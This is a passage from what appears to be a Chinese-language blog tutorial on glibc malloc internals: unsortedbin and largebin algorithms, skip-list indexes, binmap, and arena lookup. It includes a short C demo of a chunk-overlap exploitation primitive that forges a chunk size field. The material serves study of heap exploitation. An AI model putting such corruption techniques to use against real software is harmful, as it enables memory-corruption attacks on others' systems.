<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))			<span class="comment">//非mmap映射区</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">// 尝试向前合并</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) <span class="comment">// 尝试向后合并</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        bck = unsorted_chunks(av); <span class="comment">// 挂到unsortedbin上</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">		...</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">		...</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// 合并到topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h5><p>当<code>tcache</code>,<code>fastbins</code>,<code>smallbins</code>都没有满足一次分配请求,可能是请求大小太大,或者哥仨穷的叮当响,反正就是没满足</p>
<p>为了利用局部性原则,<code>unsortedbin</code>中有一个指针<code>last_remainder</code>,也就是最后一次切割<code>unsortedbin</code>中堆块后剩下的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">外圈循环</span><br><span class="line">	内圈循环遍历unsortedbin,对于每个unsorted中的堆块:</span><br><span class="line">		如果是unsorted中的唯一堆块,并且该块是last_remainder并且这块足够相应请求 则:</span><br><span class="line">			继续切它,*返回*需要的,留下多余的</span><br><span class="line">		否则可能有如下情况:<span class="number">1.</span>这块不是unsorted中的唯一块 <span class="number">2.</span>不是last_remainder <span class="number">3.</span>不够大   此时应:</span><br><span class="line">			把它从unsortedbin上拆下来,然后:</span><br><span class="line">			如果大小正好满足请求</span><br><span class="line">				如果tcache未满,则放到tcache中</span><br><span class="line">				如果tcache满了,或者未启用tcache,则直接*返回*</span><br><span class="line">			否则如果大小在smallbins范围内,则放到smallbins中</span><br><span class="line">			否则大小在largebins范围内,则放到largebins中</span><br><span class="line">			如果被放到了tcache中,此时从tcache中拿一个*返回*</span><br><span class="line">    内圈循环结束</span><br><span class="line">                </span><br><span class="line">	如果申请大小在largebins范围,则尝试使用largebin分配</span><br><span class="line">	如果刚才的largebin没有满足请求,则遍历更大号的largebin中找</span><br><span class="line">	如果还没满足,使用topchunk分配</span><br><span class="line">	如果还没满足,使用sysmalloc分配</span><br><span class="line">                </span><br><span class="line">外圈循环结束</span><br></pre></td></tr></table></figure>

<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><h5 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *p1;</span><br><span class="line">    <span class="type">size_t</span> *p2;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// usable(0x400) + header(0x10)</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">// usable(0x40) + header(0x10)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *p1_size = (<span class="type">char</span>*)p1 - <span class="number">0x8</span>;      </span><br><span class="line">    *p1_size = <span class="number">0x461</span>;       <span class="comment">//suppose off by one ... </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);			<span class="comment">//in unsortedbin</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc overlap.c -o overlap -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./overlap</span><br><span class="line">p1: 0x5600128e52a0</span><br><span class="line">p1: 0x5600128e52a0</span><br></pre></td></tr></table></figure>



<h3 id="大斌Largebins"><a href="#大斌Largebins" class="headerlink" title="大斌Largebins"></a>大斌Largebins</h3><p><code>bin_at(M,64~126) =&gt; large bins</code>这个范围是largetbin,一共有63个bin</p>
<p>bin内堆块大小相等</p>
<p>bin之间分了6组,组内各个bin堆块大小成等差数列</p>
<table>
<thead>
<tr>
<th>组</th>
<th>个数</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>bin_at(M,64~95)</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>bin_at(M,96~111)</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>bin_at(M,112~119)</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>bin_at(M,120~123)</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>bin_at(M,124~125)</td>
<td>2</td>
<td>…</td>
</tr>
<tr>
<td>bin_at(M,126)</td>
<td>1</td>
<td>…</td>
</tr>
</tbody></table>
<h4 id="datastructure-2"><a href="#datastructure-2" class="headerlink" title="datastructure"></a>datastructure</h4><p>假设<code>largebins</code>的<code>bin_at(M,63)</code>目前的状态如下:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x55555555dba0 —▸ 0x55555555dfe0 —▸ 0x55555555d340 —▸ 0x55555555d770 —▸ 0x55555555cb00 —▸ 0x55555555cf20 —▸ 0x7ffff7fa70d0 (main_arena+1104) ◂— 0x55555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dba0</span><br><span class="line">0x55555555dba0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dbb0: 0x000055555555dfe0      0x00007ffff7fa70d0</span><br><span class="line">0x55555555dbc0: 0x000055555555d340      0x000055555555cb00</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dfe0</span><br><span class="line">0x55555555dfe0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dff0: 0x000055555555d340      0x000055555555dba0</span><br><span class="line">0x55555555e000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d340</span><br><span class="line">0x55555555d340: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d350: 0x000055555555d770      0x000055555555dfe0</span><br><span class="line">0x55555555d360: 0x000055555555cb00      0x000055555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d770</span><br><span class="line">0x55555555d770: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d780: 0x000055555555cb00      0x000055555555d340</span><br><span class="line">0x55555555d790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cb00</span><br><span class="line">0x55555555cb00: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cb10: 0x000055555555cf20      0x000055555555d770</span><br><span class="line">0x55555555cb20: 0x000055555555dba0      0x000055555555d340</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cf20</span><br><span class="line">0x55555555cf20: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cf30: 0x00007ffff7fa70d0      0x000055555555cb00</span><br><span class="line">0x55555555cf40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/2gx 0x7ffff7fa70d0+0x10</span><br><span class="line">0x7ffff7fa70e0 &lt;main_arena+1120&gt;:       0x000055555555dba0      0x000055555555cf20</span><br></pre></td></tr></table></figure>

<p>那么画到图上长这逼样</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030144119554.png" alt="image-20241030144119554"></p>
<table>
<thead>
<tr>
<th>线条颜色</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>蓝</td>
<td>fd</td>
</tr>
<tr>
<td>绿</td>
<td>bk</td>
</tr>
<tr>
<td>粉</td>
<td>fd_nextsize</td>
</tr>
<tr>
<td>黄</td>
<td>bk_nextsize</td>
</tr>
</tbody></table>
<p><strong>实际上largebin可以看作双向链表, 又加上了跳表索引</strong></p>
<h5 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145225118.png" alt="双向链表"></p>
<h5 id="跳表索引"><a href="#跳表索引" class="headerlink" title="跳表索引"></a>跳表索引</h5><p>附加头节点<code>bin_at(M,idx)</code>只有<code>fd</code>和<code>bk</code>指针,没有<code>fd_nextsize</code>和<code>bk_nextsize</code>跳表索引</p>
<p>所有堆块首先按照大小降序排列成双向链表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x421]-&gt;[0x421]-&gt;[0x411]-&gt;[0x411]-&gt;[0x401]-&gt;[0x401]</span><br></pre></td></tr></table></figure>

<p>只在相同大小的堆块簇的<strong>首个堆块</strong>上建立<strong>跳表索引</strong>,指向<strong>下一个大小不同的堆块簇</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145332777.png" alt="跳表索引"></p>
<h5 id="链表-跳表"><a href="#链表-跳表" class="headerlink" title="链表+跳表"></a>链表+跳表</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030150204350.png" alt="image-20241030150204350"></p>
<h5 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h5><p><code>binmap</code>用于在<code>largebin</code>的中加速查找更大的非空的<code>bin</code> </p>
<p><code>binmap</code> 是<code>malloc_state</code>的成员,<code>4</code>个<code>int</code>,实际上就是一个<code>128</code>位的位向量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="comment">//unsigned int binmap[4];</span></span><br></pre></td></tr></table></figure>





<p><code>i</code> 就是根据堆块大小落到的<code>largebin</code>下标<code>idx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))		<span class="comment">//标记下标为i的桶子中有至少一个堆块</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))	<span class="comment">//标记下标为i的桶子中一个堆块也没有</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))		<span class="comment">//查看下标为i的桶子中有没有堆块</span></span></span><br></pre></td></tr></table></figure>

<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(m,63) </span><br><span class="line">	binmap[63&gt;&gt;5] |= ((1U &lt;&lt; ((63) &amp; ((1U &lt;&lt; 5) - 1))))</span><br><span class="line">	binmap[1] |= (1&lt;&lt;31)</span><br><span class="line">	</span><br><span class="line">mark_bin(m,64)</span><br><span class="line">	binmap[2] |= (1&lt;&lt;0)</span><br></pre></td></tr></table></figure>

<p>也就是对于<code>largebin</code>来说,<code>binmap[0]</code>永远用不到</p>
<h4 id="algorithm-4"><a href="#algorithm-4" class="headerlink" title="algorithm"></a>algorithm</h4><p><code>largebin</code>中的堆块,只能是来自于<code>unsortedbin</code></p>
<p>如果某次<code>malloc</code>没有从<code>tcache,fastbins,smallbins</code>,中得到想要的堆块</p>
<p>此时需要遍历<code>unsortedbin</code>,整理其中的所有堆块,归类到<code>smallbins</code>或者<code>largebins</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unsortedbin整理算法:</span></span><br><span class="line"></span><br><span class="line">如果unsortedbin只有last_remainder并且他能满足分配需求</span><br><span class="line">	那么从last_remainder头部切出需求,剩下的继续作为last_remainder,然后返回</span><br><span class="line"></span><br><span class="line">否则 将unsorted上的这块先拿下来</span><br><span class="line">	如果这块的大小正好等于需求</span><br><span class="line">		如果tcache不满则先搬到tcache并记下tcache可以满足,<span class="keyword">continue</span>, 在整理完所有unsortedbin之后再返回, 整理过程中如果tcache满了也会返回</span><br><span class="line">		否则tcache满则直接返回</span><br><span class="line">	否则</span><br><span class="line">		如果这块在smallbin范围内就放到smallbin</span><br><span class="line">		否则这块在largebin范围内就放到largebin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将<code>unsortedbin</code>堆块放到<code>smallbins</code>中时非常简单,因为<code>smallbins</code>中的堆块大小和桶子下标有严格的关系,根据堆块大小计算出下标,头插法一塞就完了</p>
<p><strong>但是往<code>largebin</code>放时,一个<code>bin</code>里面可能会有不同大小的堆块,需要先通过跳表索引进行插入排序</strong></p>
<h5 id="插入更小的堆块"><a href="#插入更小的堆块" class="headerlink" title="插入更小的堆块"></a>插入更小的堆块</h5><p>假设现在<code>bin_at(M,63)</code>中已经有<code>0x421,0x411</code>的跳表索引</p>
<p>又要将一个<code>0x401</code>的堆块放进去</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101203700160.png" alt="image-20241101203700160"></p>
<h5 id="插入已有索引的堆块"><a href="#插入已有索引的堆块" class="headerlink" title="插入已有索引的堆块"></a>插入已有索引的堆块</h5><p>假设现在<code>bin_at(M,63)</code>中已经有<code>0x421,0x411,0x401</code>的跳表索引</p>
<p>又要将一个<code>0x411</code>的堆块放进去,那么过程将会是这样的:</p>
<p>0.计算得知<code>0x411</code>落在<code>bin_at(M,63)</code>范围</p>
<p>1.与<code>bin_at(M,63)-&gt;bk</code>,也就是这个<code>bin</code>里最小的堆块,也就是一个<code>0x401</code>的堆块进行比较,发现新放入的堆块<strong>不是最小的</strong>,不能直接放到<code>bin_at(M,63)-&gt;bk</code>上,需要从大到小遍历这个<code>bin</code>,进行<strong>插入排序</strong></p>
<p>2.从<code>bin_at(M,63)-&gt;fd</code>,有就是这个<code>bin</code>里最大的堆块,也就是与<code>0x421</code>开始比较,发现新放入的堆块比他小</p>
<p>3.利用<code>0x421</code> 上的跳表索引,找到了<code>0x411</code>的,新堆块可以放到这里了</p>
<p>4.保持跳表索引堆块不变,在其<code>fd</code>上插入新堆块</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030153014682.png" alt="image-20241030153014682"></p>
<h5 id="插入不存在索引的堆块"><a href="#插入不存在索引的堆块" class="headerlink" title="插入不存在索引的堆块"></a>插入不存在索引的堆块</h5><p>假设现在<code>bin_at(M,63)</code>中已经有<code>0x421,0x401</code>的跳表索引</p>
<p>又要将一个<code>0x411</code>的堆块放进去,那么过程将会是这样的:</p>
<h5 id="当前bin中有堆块时拿走一个"><a href="#当前bin中有堆块时拿走一个" class="headerlink" title="当前bin中有堆块时拿走一个"></a>当前bin中有堆块时拿走一个</h5><p><code>largebin</code> 在拿走堆块时采用最佳适配策略,也就是说尽量找一个最小的堆块满足分配需求</p>
<p>首先计算得到<code>bin_at(M,idx)</code></p>
<p>然后通过<code>fd</code>链表找到该<code>bin</code>中最大的块</p>
<p>如果最大的块都无法满足需求,则使用<code>largebin</code>显然无法满足需求,没必要在<code>largebin</code>这里浪费时间了</p>
<p>否则本<code>bin</code>中必然存在能够满足需求的块,起码最大的块肯定可以,但是直接用这个最大块太亏,切割最大块之后造成外部碎片的可能性更大,因此接下来需要找到最佳适配的临界块</p>
<p>利用最大块的<code>bk_nextsize</code>索引跳到最小块上,然后再沿着<code>bk_nextsize</code>向更大块遍历,如此寻找最佳适配</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030155542420.png" alt="image-20241030155542420"></p>
<p>找到最佳适配后,首先尝试拿走普通堆块,没有普通堆块再拿走索引堆块,</p>
<p>然后在这个堆块上切割出分配需求来,</p>
<p>如果剩余的下脚料太小了,小于<code>0x20</code>字节,就不抠搜了,整个普通节点全都返回,就当送人了</p>
<p>如果剩余的下脚料还行,大于等于<code>0x20</code>,那么就把下脚料扔给<code>unsortedbin</code></p>
<h5 id="当前bin中没有堆块时拿走一个"><a href="#当前bin中没有堆块时拿走一个" class="headerlink" title="当前bin中没有堆块时拿走一个"></a>当前bin中没有堆块时拿走一个</h5><p>首先根据堆块大小计算出<code>idx</code></p>
<p>发现<code>idx</code>对应的<code>largebin</code>中没有堆块</p>
<p>于是沿着<code>idx++</code>的方向,向更大的<code>bin</code>中寻找目标</p>
<p>这个寻找的过程使用了<code>binmap</code>加速</p>
<p>整个<code>binmap</code>分为四个<code>block</code>, 对应到四个<code>int</code></p>
<p>根据当前<code>bin</code>的下标<code>idx</code>计算出所属的<code>block</code></p>
<p>如果<code>binmap[block] &gt; idx2bit(idx)</code></p>
<p>这就说明<code>idx</code>所属的块中,<strong>可能</strong>存在更大的<code>bin</code>,其中有堆块</p>
<p>找到这个更大的<code>bin</code>,实际判断一下其中到底有没有堆块</p>
<p>从这个大<code>bin</code>中拿出一块切割,返回</p>
<p>切剩下的如果很小则一并返回了</p>
<p>否则放到<code>unsortedbin</code></p>
<h2 id="多线程场景"><a href="#多线程场景" class="headerlink" title="多线程场景"></a>多线程场景</h2><h3 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h3><p>在通常情况下,堆区的申请和释放只会使用到主分配区<code>main_arena</code>,在多线程等情况下可能存在多个分配区,但是我们依然只管<code>malloc</code>和<code>free</code>,并没有指定从哪个分配区申请或者释放堆块</p>
<p>首先说释放:</p>
<p>实际上是<code>libc_free</code>决定了往哪里释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">//对于mmap申请的堆块,使用munmap倒回去</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       <span class="comment">//从分配区来的堆块,还给分配区</span></span><br><span class="line">        MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">        (<span class="type">void</span>)tag_region(chunk2mem(p), memsize(p));</span><br><span class="line"></span><br><span class="line">        ar_ptr = arena_for_chunk(p);</span><br><span class="line">        _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在调用<code>_int_free</code>时传递了分配区指针<code>ar_ptr</code>,他是这样计算的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar_ptr = arena_for_chunk(p);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> malloc_state *</span><br><span class="line"><span class="title function_">arena_for_chunk</span> <span class="params">(mchunkptr ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>chunk_main_arena(ptr)</code>会检查堆块的A标志位,对于来自非主分配区的堆块,会调用<code>heap_for_ptr</code>计算其所在分配区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> heap_info *</span><br><span class="line"><span class="title function_">heap_for_ptr</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> max_size = heap_max_size ();</span><br><span class="line">  <span class="keyword">return</span> PTR_ALIGN_DOWN (ptr, max_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这干了个啥事呢?</p>
<p><code>max_size</code>实际上是<code>64M</code>,然后<code>ptr</code>向下对齐到<code>64M</code>,是什么一个效果呢?</p>
<p><code>ptr &amp; 0xfffffffffc000000</code></p>
<p>比如假设<code>ptr = 0x555558026520</code></p>
<p>那么此时<code>ptr &amp; 0xfffffffffc000000 = 0x555558026520 &amp; 0xfffffffffc000000 = 0x555558000000</code></p>
<p>这个值就被认为是<code>ptr</code>所在的分配区描述符<code>heap_info</code>的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">struct</span> _heap_info &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    mstate ar_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">size_t</span> size;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">size_t</span> mprotect_size;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> pad[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   48 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>然后其中的<code>ar_ptr</code>就是分配区<code>malloc_state</code>指针</p>
<p>也就是说, 对于一个堆块p</p>
<p>如果其有标志位A,那么直接使用<code>glibc</code>中的<code>main_arena</code>指针返回主分配区</p>
<p>如果其无标志位A,那么首先将其地址向下对齐到<code>64M</code>得到<code>heap_info</code>的位置,然后得到<code>ar_ptr</code>的位置</p>
<h3 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h3><p>如果只有一个线程显然不需要建立多个分配区,因为控制流同一时间只能有一个分配请求</p>
<p>那么对于多线程环境,首先如何界定多线程呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __libc_multiple_threads;</span><br><span class="line">libc_hidden_proto (__libc_multiple_threads)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined SINGLE_THREAD_BY_GLOBAL || IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P \</span></span><br><span class="line"><span class="meta">  (THREAD_GETMEM (THREAD_SELF, header.multiple_threads) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P (__libc_multiple_threads == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTLD_SINGLE_THREAD_P SINGLE_THREAD_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _SINGLE_THREAD_H  */</span></span></span><br><span 